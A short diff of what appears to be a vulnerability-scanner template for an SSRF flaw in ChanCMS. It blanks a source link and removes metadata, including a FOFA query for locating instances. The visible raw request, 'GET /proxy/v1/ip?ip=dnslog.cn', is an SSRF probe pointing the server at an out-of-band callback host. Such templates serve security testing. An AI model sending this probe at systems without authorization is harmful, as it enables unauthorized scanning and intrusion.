@@ -3,12 +3,8 @@ info:
   name: ChanCMS系统 ip 接口存在ssrf漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fbri70do4st14ao1'
+  description: ''
   tags: ssrf,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fbri70do4st14ao1
-    fofa: body="ChanCMS"
 http:
 - raw:
   - 'GET /proxy/v1/ip?ip=dnslog.cn HTTP/1.1
